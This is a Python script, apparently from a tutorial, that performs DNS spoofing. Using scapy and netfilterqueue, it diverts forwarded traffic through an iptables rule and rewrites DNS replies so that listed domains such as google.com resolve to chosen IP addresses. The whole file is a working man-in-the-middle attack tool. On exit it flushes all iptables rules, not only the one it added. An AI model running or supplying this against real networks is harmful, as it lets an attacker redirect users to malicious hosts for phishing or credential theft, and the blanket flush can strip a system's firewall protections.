from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
from colorama import Fore, init


# define some colors
GREEN = Fore.GREEN
RESET = Fore.RESET
# init the colorama module
init()

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.117
dns_hosts = {
    "google.com": "10.1.1.2",
    "stackoverflow.com": "35.171.123.176",
}


def is_same_domain(domain1, domain2):
    """Checks whether two domains are the same regardless of www.
    For instance, `www.google.com` and `google.com` are the
    same domain."""
    domain1 = domain1.replace("www.", "")
    domain2 = domain2.replace("www.", "")
    return domain1 == domain2


def get_modified_ip(qname, dns_hosts=dns_hosts):
    """Checks whether `domain` is in `dns_hosts` dictionary.
    If it is, returns the modified IP address, otherwise returns
    None."""
    for domain in dns_hosts:
        if is_same_domain(qname, domain):
            return dns_hosts[domain]


def process_packet(packet):
    """Whenever a new packet is redirected to the netfilter queue,
    this callback is called."""
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    """Modifies the DNS Resource Record `packet` (the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this
    function replaces
    the real IP address (172.217.19.142) with fake IP address
    (10.1.1.2)"""
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    # decode the domain name to string and remove the trailing dot
    qname = qname.decode().strip(".")
    # get the modified IP if it exists
    modified_ip = get_modified_ip(qname)
    if not modified_ip:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # print the original IP address
    print(f"{GREEN} [+] Domain: {qname}{RESET}")
    print(f"{GREEN} [+] Original IP: {packet[DNSRR].rdata}{RESET}")
    print(f"{GREEN} [+] Modifed (New) IP: {modified_ip}{RESET}")
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "10.1.1.2"
    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=modified_ip)
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required (scapy will do automatically)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`, and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
